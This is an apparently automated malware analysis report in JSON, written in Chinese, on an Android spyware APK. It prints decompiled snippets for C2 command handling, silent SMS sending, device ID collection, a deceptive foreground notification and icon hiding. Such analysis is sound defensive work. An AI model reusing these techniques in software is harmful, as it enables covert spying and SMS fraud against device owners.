@@ -1,0 +1,174 @@
+{
+  "APK信息": {
+    "文件名": "88b1fc39c3e89e790fa7fdba78516ac52b489209e9fb38c39aac416f53fdde90.apk",
+    "sha256": "88b1fc39c3e89e790fa7fdba78516ac52b489209e9fb38c39aac416f53fdde90",
+    "包名": "ru.dragon.chicken",
+    "应用名": "Пoсланиe",
+    "是否恶意": true,
+    "风险等级": "高",
+    "分析耗时(秒)": 193.7
+  },
+  "行为列表": [
+    {
+      "行为": "c2_communication",
+      "中文名": "C2通信/远程控制",
+      "MITRE": "T1437",
+      "置信度": "suspected",
+      "证据": {
+        "方法引用": [],
+        "权限": [],
+        "字符串": [
+          "command"
+        ]
+      },
+      "恶意代码": [
+        {
+          "class_path": "Lru\\dragon\\chicken\\Cellar;",
+          "method_signature": "if(a(jSONObject, 1, 1, \"\", \"\", \"\")",
+          "malicious_behavior": "c2_communication",
+          "behavior_type": "malicious",
+          "risk_level": "高",
+          "malicious_code_snippet": "if (i == 40) { a(jSONObject.getString(\"text\")); }\nif (a(jSONObject, 1, 1, \"\", \"\", \"\")) {\n    new c(getApplicationContext(), 3).a(\"id\", string).a(\"command\", Integer.valueOf(i)).a(\"status\", Integer.valueOf(iA)).a(\"data\", jSONArray).a(\"post\", Boolean.valueOf(z)).a();\n}\nIntent intent = new Intent(getApplicationContext(), Chaos.class);\nintent.setAction(\"status\");\nintent.putExtra(\"command\", i);",
+          "malicious_code_snippet_context": "if (i == 40) { a(jSONObject.getString(\"text\")); }\nif (a(jSONObject, 1, 1, \"\", \"\", \"\")) {\n    new c(getApplicationContext(), 3).a(\"id\", string).a(\"command\", Integer.valueOf(i)).a(\"status\", Integer.valueOf(iA)).a(\"data\", jSONArray).a(\"post\", Boolean.valueOf(z)).a();\n}\nIntent intent = new Intent(getApplicationContext(), Chaos.class);\nintent.setAction(\"status\");\nintent.putExtra(\"command\", i);",
+          "behavior_description": "该代码是典型的C2命令分发与执行结果回传模块。程序解析C2服务器下发的JSONObject指令，根据命令编号i执行对应操作（如命令40时提取text字段内容交给a()处理），随后通过链式调用构建HTTP请求（new c(getApplicationContext(), 3)），将命令id、command编号、status执行状态码、data数据等字段回传至C2服务器，形成'接收指令→执行→上报结果'的远程控制闭环；同时通过Intent向内部Chaos组件广播status动作同步命令执行状态。结合厂商报告确认该样本为利用AccessibilityService的间谍类恶意软件，此代码是其远程控制通道的核心实现。",
+          "glm_analyzed": true
+        }
+      ]
+    },
+    {
+      "行为": "sms_fraud",
+      "中文名": "短信欺诈",
+      "MITRE": "T1416",
+      "置信度": "likely",
+      "子行为": [
+        {
+          "子行为": "sms_send",
+          "中文名": "短信发送",
+          "置信度": "likely",
+          "证据": {
+            "方法引用": [],
+            "权限": [
+              "android.permission.SEND_SMS"
+            ],
+            "字符串": [
+              "sendTextMessage"
+            ]
+          }
+        }
+      ],
+      "恶意代码": [
+        {
+          "class_path": "Lru\\dragon\\chicken\\b;",
+          "method_signature": "a(Context context, String str, String str2, PendingIntent pendingIntent)",
+          "malicious_behavior": "sms_fraud",
+          "behavior_type": "malicious",
+          "risk_level": "高",
+          "malicious_code_snippet": "public static void a(Context context, String str, String str2, PendingIntent pendingIntent) {\n    try {\n        Investigation.a(true);\n        SmsManager.getDefault().sendTextMessage(str, null, str2, pendingIntent, null);\n    } catch (Exception e) {\n    }\n}",
+          "malicious_code_snippet_context": "          d(context).setRepeating(0, j, 60000L, PendingIntent.getBroadcast(context, 0, new Intent(context, (Class<?>) DeficiencyManner.class), 134217728));\n      }\n  \n>>>     public static void a(Context context, String str, String str2, PendingIntent pendingIntent) {\n>>>         try {\n>>>             Investigation.a(true);\n>>>             SmsManager.getDefault().sendTextMessage(str, null, str2, pendingIntent, null);\n>>>         } catch (Exception e) {\n>>>         }\n>>>     }\n  \n      public static void a(Context context, boolean z) {\n          int i = Build.VERSION.SDK_INT >= 19 ? 132 : 4;",
+          "behavior_description": "该方法封装了静默发送短信的功能。接收目标号码(str)、短信内容(str2)和发送状态回调PendingIntent作为参数，直接调用SmsManager.getDefault().sendTextMessage()在后台无用户感知的情况下发送短信，且异常被静默捕获以规避崩溃和检测。结合样本所属的ru.dragon.chicken混淆包名、周边代码中的定时任务(setRepeating轮询DeficiencyManner混淆类)以及Zscaler报告确认该样本为伪装成短信应用的恶意软件，此处短信发送行为极可能用于向增值服务号码发送扣费短信或向C2指定的号码发送垃圾/欺诈短信，直接造成用户话费损失。数据流向：外部传入的目标号码与短信内容(可能来自C2指令或硬编码配置)→SmsManager静默发送短信。",
+          "glm_analyzed": true
+        }
+      ]
+    },
+    {
+      "行为": "device_fingerprinting",
+      "中文名": "设备指纹采集",
+      "MITRE": "T1437",
+      "置信度": "likely",
+      "证据": {
+        "方法引用": [],
+        "权限": [
+          "android.permission.READ_PHONE_STATE"
+        ],
+        "字符串": [
+          "ANDROID_ID"
+        ]
+      },
+      "恶意代码": [
+        {
+          "class_path": "Lru\\dragon\\chicken\\b;",
+          "method_signature": "c(Context context)",
+          "malicious_behavior": "device_fingerprinting",
+          "behavior_type": "malicious",
+          "risk_level": "中",
+          "malicious_code_snippet": "public static String c(Context context) {\n    return Settings.Secure.getString(context.getContentResolver(), \"android_id\");\n}",
+          "malicious_code_snippet_context": "          return false;\n      }\n  \n>>>     public static String c(Context context) {\n>>>         return Settings.Secure.getString(context.getContentResolver(), \"android_id\");\n>>>     }\n  \n      private static void c(Context context, long j) {\n          if (j - a > 10173) {",
+          "behavior_description": "该方法通过 Settings.Secure.getString 从系统设置提供器中读取设备的 ANDROID_ID 持久唯一标识符，实现设备指纹采集。数据流向为：系统 Settings.Secure 数据源（source）→ 返回给上层恶意调用链（sink），在该已确认的恶意样本（伪装成短信应用、滥用 AccessibilityService 的间谍木马，来自虚假彩信网站传播渠道）中，该标识符通常与其他设备信息拼接后上传至 C2 服务器，用于标识和追踪受害设备。此外，同类中的 c(Context, long) 方法在约 10 秒延迟后隐式启动 Splurge 活动，属于恶意载荷的延迟触发逻辑，与指纹采集共同构成木马的侦察与驻留机制。",
+          "glm_analyzed": true
+        }
+      ]
+    },
+    {
+      "行为": "persistence",
+      "中文名": "持久化",
+      "MITRE": "T1444",
+      "置信度": "suspected",
+      "子行为": [
+        {
+          "子行为": "foreground_service",
+          "中文名": "前台服务保活",
+          "置信度": "suspected",
+          "证据": {
+            "方法引用": [],
+            "权限": [],
+            "字符串": [
+              "startForeground"
+            ]
+          }
+        }
+      ],
+      "恶意代码": [
+        {
+          "class_path": "Lru\\dragon\\chicken\\EffortDemonstrate;",
+          "method_signature": "if(Build.VERSION.SDK_INT >= 26)",
+          "malicious_behavior": "persistence",
+          "behavior_type": "malicious",
+          "risk_level": "中",
+          "malicious_code_snippet": "if (Build.VERSION.SDK_INT >= 26) {\n    new NotificationChannel(\"ru.dragon.chicken.POLICY\", \"Knee\", 1);\n    builder = new Notification.Builder(getApplicationContext(), \"ru.dragon.chicken.POLICY\");\n} else {\n    builder = new Notification.Builder(getApplicationContext());\n}\nbuilder.setSmallIcon(android.R.drawable.ic_dialog_info).setContentTitle(\"Основнoй процecc\").setContentText(\"Сиcтeма не корректнo рaбoтaет, вaм нeoбходимo включить доcтуп к cтaтиcтике для 'Основнoй процecc'\");\nstartForeground(1638, builder.build());",
+          "malicious_code_snippet_context": "  \n      private void a() throws IllegalAccessException, InvocationTargetException {\n          Notification.Builder builder;\n>>>         if (Build.VERSION.SDK_INT >= 26) {\n>>>             this.a.getClass().getMethod(\"createNotification\" + String.valueOf(\"Channel\"), NotificationChannel.class).invoke(this.a, new NotificationChannel(\"ru.dragon.chicken.POLICY\", \"Knee\", 1));\n>>>             builder = new Notification.Builder(getApplicationContext(), \"ru.dragon.chicken.POLICY\");\n>>>         } else {\n>>>             builder = new Notification.Builder(getApplicationContext());\n>>>         }\n>>>         builder.setSmallIcon(android.R.drawable.ic_dialog_info).setContentTitle(\"Основнoй процecc\").setContentText(\"Сиcтeма не корректнo рaбoтaет, вaм нeoбходимo включить доcтуп к cтaтиcтике для 'Основнoй процecc'\").setWhen(System.currentTimeMillis());\n>>>         startForeground(1638, builder.build());\n      }\n  \n      private void b() {",
+          "behavior_description": "该代码位于恶意 Service 内部，通过反射创建低优先级通知渠道（ru.dragon.chicken.POLICY），并构造一条伪装成系统错误的俄语通知（标题'Основнoй процecc'即'主进程'，正文谎称'系统运行不正常，您需要为主进程开启统计信息访问权限'），随后调用 startForeground(1638, ...) 将自身提升为前台服务。数据流向：硬编码的欺骗性通知文本 → Notification.Builder 构建通知 → startForeground() 前台保活。其目的一是防止系统回收恶意进程实现持久化驻留，二是通过伪造系统错误提示对用户进行社会工程学诱导，促使用户主动授予'使用情况访问/无障碍'等敏感权限，与厂商报告中确认的 AccessibilityService 滥用及隐蔽监控行为相配合。",
+          "glm_analyzed": true
+        }
+      ]
+    },
+    {
+      "行为": "icon_hiding",
+      "中文名": "图标隐藏",
+      "MITRE": "",
+      "置信度": "suspected",
+      "证据": {
+        "方法引用": [],
+        "权限": [],
+        "字符串": [
+          "setComponentEnabledSetting"
+        ]
+      },
+      "恶意代码": [
+        {
+          "class_path": "Lru\\dragon\\chicken\\Knife;",
+          "method_signature": "a()",
+          "malicious_behavior": "icon_hiding",
+          "behavior_type": "malicious",
+          "risk_level": "高",
+          "malicious_code_snippet": "getPackageManager().setComponentEnabledSetting(new ComponentName(getApplicationContext(), (Class<?>) Knife.class), 2, 1);",
+          "malicious_code_snippet_context": "  /* JADX INFO: loaded from: classes.dex */\n  public class Knife extends Activity {\n      private void a() {\n>>>         getPackageManager().setComponentEnabledSetting(new ComponentName(getApplicationContext(), (Class<?>) Knife.class), 2, 1);\n      }\n  \n      @Override // android.app.Activity",
+          "behavior_description": "该 Activity（Knife，伪装为'Сообщениe/Messages'的恶意样本入口组件）在 onCreate 中调用 a() 方法，通过 PackageManager.setComponentEnabledSetting 将自身启动器组件设置为 COMPONENT_ENABLED_STATE_DISABLED（参数2），随后立即 finish() 关闭界面。数据流向：getApplicationContext() 获取自身上下文 → 构造 ComponentName 指向自身启动 Activity → setComponentEnabledSetting 禁用该组件，导致应用图标从桌面启动器中消失。用户无法看到图标也就难以发现和卸载该应用，实现隐蔽驻留，与厂商报告中'hides itself in order to spy on its victims'（隐藏自身以监控受害者）及滥用 AccessibilityService 的间谍行为相互印证，属于典型的恶意图标隐藏行为。",
+          "glm_analyzed": true
+        }
+      ]
+    }
+  ],
+  "覆盖范围": {
+    "静态分析": "完整",
+    "动态分析": "未执行",
+    "方法引用分析": "完整",
+    "JADX反编译": "完整",
+    "LLM语义分析": "已执行",
+    "LLM交叉验证": "已执行",
+    "验证模型": "qwen3.8",
+    "局限性": [
+      "C2服务器.是否活跃: 需动态分析",
+      "C2服务器.轮询间隔(秒): 需动态分析"
+    ]
+  }
+}
